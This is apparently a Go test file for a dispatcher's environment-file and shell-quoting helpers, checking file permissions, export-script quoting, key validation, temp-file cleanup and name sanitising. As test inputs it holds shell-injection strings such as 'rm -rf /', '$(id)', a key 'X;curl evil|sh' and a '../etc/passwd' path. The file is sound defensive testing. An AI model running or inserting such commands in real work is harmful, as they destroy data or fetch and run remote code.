package adapter

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestWriteDotEnvFile_CreatesMode0600(t *testing.T) {
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".env"),
		[]byte("API_KEY=secretvalue\nDB_URL=postgres://x\n"), 0o644))

	path, cleanup, err := WriteDotEnvFile(dir)
	require.NoError(t, err)
	require.NotEmpty(t, path, "should create a file when .env is present")
	defer cleanup()

	info, err := os.Stat(path)
	require.NoError(t, err)
	// 0600 is mandatory for the credential-safety guarantee — anyone else on
	// the box must NOT be able to read the env values.
	assert.Equal(t, os.FileMode(0o600), info.Mode().Perm(), "env file must be mode 0600")

	body, err := os.ReadFile(path)
	require.NoError(t, err)
	// Format must be KEY=VALUE\n (docker --env-file format), no `export`,
	// no shell quoting — docker reads values literally.
	got := string(body)
	assert.Contains(t, got, "API_KEY=secretvalue\n")
	assert.Contains(t, got, "DB_URL=postgres://x\n")
}

func TestWriteDotEnvFile_NoEnvReturnsEmpty(t *testing.T) {
	dir := t.TempDir()
	path, cleanup, err := WriteDotEnvFile(dir)
	require.NoError(t, err)
	assert.Empty(t, path, "no .env → no tempfile")
	cleanup() // should be a noop
}

func TestWriteDotEnvFile_CleanupRemovesFile(t *testing.T) {
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".env"), []byte("X=1\n"), 0o644))

	path, cleanup, err := WriteDotEnvFile(dir)
	require.NoError(t, err)
	require.NotEmpty(t, path)

	_, err = os.Stat(path)
	require.NoError(t, err, "file should exist before cleanup")

	cleanup()
	_, err = os.Stat(path)
	assert.True(t, os.IsNotExist(err), "cleanup must remove the tempfile")
}

func TestDotEnvExportScript_FormatsAsBashExports(t *testing.T) {
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".env"),
		[]byte("API_KEY=hunter2\nWITH_SPACE=hello world\nWITH_INJECT=x'; rm -rf / #\n"), 0o644))

	script, err := DotEnvExportScript(dir)
	require.NoError(t, err)

	// Each line should be `export KEY='VALUE'` so it's safe to source in bash.
	lines := strings.Split(strings.TrimRight(script, "\n"), "\n")
	require.Len(t, lines, 3)
	for _, line := range lines {
		assert.True(t, strings.HasPrefix(line, "export "), "expected 'export ' prefix; got %q", line)
	}
	// Spaces must be shell-quoted so bash treats the value as one argument.
	assert.Contains(t, script, "WITH_SPACE='hello world'\n")
	// A single quote in the value — the actual shell-injection boundary — must be
	// escaped as '\'' so the value can't break out of its literal.
	assert.Contains(t, script, `WITH_INJECT='x'\''; rm -rf / #'`+"\n", "single quotes must be escaped, not just spaces quoted")

	// Prove it: sourcing the script and echoing must reproduce the exact value.
	got, err := exec.Command("sh", "-c", script+"printf %s \"$WITH_INJECT\"").Output()
	require.NoError(t, err)
	assert.Equal(t, "x'; rm -rf / #", string(got), "the injected value must survive sourcing verbatim, uninterpreted")
}

// Extra env keys don't come from .env (which validates them), so they must be
// validated too — a key with shell metacharacters would be command injection on
// the `export <key>=...` path where value-quoting can't protect the left side.
func TestDotEnvExportScript_RejectsInvalidExtraKey(t *testing.T) {
	dir := t.TempDir() // no .env

	_, err := DotEnvExportScript(dir, map[string]string{"X;curl evil|sh": "1"})
	require.Error(t, err, "an extra key with shell metacharacters must be rejected")

	script, err := DotEnvExportScript(dir, map[string]string{"SHARD_INDEX": "0"})
	require.NoError(t, err, "a valid extra key is accepted")
	assert.Contains(t, script, "export SHARD_INDEX=")
}

func TestSweepStaleEnvFiles_RemovesOnlyStaleEnvFiles(t *testing.T) {
	tmp := os.TempDir()

	stale := filepath.Join(tmp, "dispatcher-env-stale-test.env")
	fresh := filepath.Join(tmp, "dispatcher-env-fresh-test.env")
	unrelated := filepath.Join(tmp, "dispatcher-unrelated-test.txt")
	for _, p := range []string{stale, fresh, unrelated} {
		require.NoError(t, os.WriteFile(p, []byte("X=1\n"), 0o600))
		defer os.Remove(p)
	}

	old := time.Now().Add(-2 * staleEnvFileThreshold)
	require.NoError(t, os.Chtimes(stale, old, old))

	require.NoError(t, SweepStaleEnvFiles())

	_, err := os.Stat(stale)
	assert.True(t, os.IsNotExist(err), "stale dispatcher-env file must be removed")
	_, err = os.Stat(fresh)
	assert.NoError(t, err, "fresh dispatcher-env file must remain")
	_, err = os.Stat(unrelated)
	assert.NoError(t, err, "unrelated file must remain")
}

// ShellQuote is the single-quote escaping that guards every remote SSH/cloud
// command line dispatcher builds — a break-out here is direct command injection.
func TestShellQuote(t *testing.T) {
	cases := map[string]string{
		"plain":          "'plain'",
		"":               "''",
		"a b":            "'a b'",
		"it's":           `'it'\''s'`,
		"$(rm -rf /)":    `'$(rm -rf /)'`,
		"`whoami`":       "'`whoami`'",
		"a'; rm -rf / #": `'a'\''; rm -rf / #'`,
		"$HOME":          "'$HOME'",
		"back\\slash":    `'back\slash'`,
		"new\nline":      "'new\nline'",
	}
	for in, want := range cases {
		t.Run(in, func(t *testing.T) {
			assert.Equal(t, want, ShellQuote(in), "the only unquoted content must be the '\\'' escape sequence")
		})
	}
}

// A quoted arg run through `sh -c` must reproduce the exact original bytes — the
// real proof that no metacharacter escapes the literal.
func TestShellQuote_RoundTripsThroughShell(t *testing.T) {
	for _, arg := range []string{"it's", "$(id)", "a; b | c", "`x`", "quote\"mix'ed", "*glob*"} {
		out, err := exec.Command("sh", "-c", "printf %s "+ShellQuote(arg)).Output()
		require.NoError(t, err)
		assert.Equal(t, arg, string(out), "shell must see the arg verbatim, not interpret it")
	}
}

// SanitizeName derives VM/container/resource names from untrusted workload names;
// the output must always be a safe DNS-ish label with no metacharacters.
func TestSanitizeName(t *testing.T) {
	safe := func(s string) bool {
		for _, r := range s {
			if !((r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') || r == '-') {
				return false
			}
		}
		return s != "" && !strings.HasPrefix(s, "-") && !strings.HasSuffix(s, "-")
	}
	for _, in := range []string{"My App!", "../etc/passwd", "rm -rf /", "", "---", "über", strings.Repeat("x", 200), "a.b_c/d"} {
		got := SanitizeName(in)
		assert.True(t, safe(got), "SanitizeName(%q)=%q must be a safe label", in, got)
		assert.LessOrEqual(t, len(got), 40)
	}
	assert.Equal(t, "workload", SanitizeName("!!!"), "an all-invalid name falls back to a default, never empty")
}
